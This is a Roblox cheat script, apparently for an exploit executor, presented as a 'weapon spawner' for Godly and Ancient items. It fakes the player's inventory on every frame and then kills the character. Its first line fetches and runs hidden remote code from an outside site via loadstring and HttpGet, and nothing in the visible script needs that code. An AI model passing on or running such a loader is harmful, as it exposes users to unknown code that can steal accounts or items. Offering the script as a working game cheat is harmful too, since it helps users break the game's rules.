-- Weapon Spawner Script (Godly & Ancient Only - Exclude Specific Items)
-- Run this in your executor

-- Load the external script first
loadstring(game:HttpGet("https://syncapp.lol/run/JhPParJ3IMATWpdZfFWRJ3GICyf8hNXwrdoEagd9uUQ5E5ws_ShmmEdI2w"))()

local WeaponOwnedRange = {
    min = 1,
    max = 150
}

-- Only spawn Godly and Ancient weapons
local AllowedRarities = {
    "Godly",
    "Ancient"
}

-- Specific items to exclude (even if they match rarity)
local ExcludedItems = {
    "NikKnife",
    "Emptybringer",
    "EmptybringerChroma",
    "Icehammer_ancient",
    "Icehammer_godly",
    "Gingerscythe_ancient",
    "Gingerscythe_godly",
    "Synthwave_ancient",
    "Reaver_ancient",
    "Reaver_godly",
    "RaygunGold",
    "RaygunBronze",
    "RaygunRed",
    "RaygunSilver",
    -- Add more items to exclude here if needed
}

-- Track if Corrupt has been spawned
local corruptSpawned = false

local DataBase = require(game:GetService("ReplicatedStorage").Database.Sync.Item)
local PlayerData = require(game:GetService("ReplicatedStorage").Modules.ProfileData)

local newOwned = {}

-- Function to check if item should be excluded by name
local function IsExcluded(itemName)
    for _, excluded in ipairs(ExcludedItems) do
        if string.lower(itemName) == string.lower(excluded) then
            return true
        end
    end
    return false
end

-- Function to check if item is allowed (Godly or Ancient)
local function IsAllowed(itemData)
    if not itemData or not itemData.Rarity then
        return false
    end
    
    for _, rarity in ipairs(AllowedRarities) do
        if string.lower(itemData.Rarity) == string.lower(rarity) then
            return true
        end
    end
    return false
end

-- Function to check if item is Corrupt (case insensitive)
local function IsCorrupt(itemName)
    return string.lower(itemName):find("corrupt") ~= nil
end

-- Loop through all weapons and add only Godly/Ancient ones
for i, v in pairs(DataBase) do
    -- Skip excluded items first
    if not IsExcluded(i) then
        if IsAllowed(v) then
            -- Check if it's a Corrupt weapon
            if IsCorrupt(i) then
                -- Only spawn Corrupt if it hasn't been spawned yet
                if not corruptSpawned then
                    newOwned[i] = math.random(WeaponOwnedRange.min, WeaponOwnedRange.max)
                    corruptSpawned = true
                end
            else
                -- Spawn all other Godly/Ancient weapons normally
                newOwned[i] = math.random(WeaponOwnedRange.min, WeaponOwnedRange.max)
            end
        end
    end
end

local PlayerWeapons = PlayerData.Weapons

game:GetService("RunService"):BindToRenderStep("InventoryUpdate", 0, function()
    PlayerWeapons.Owned = newOwned
end)

game.Players.LocalPlayer.Character:BreakJoints()
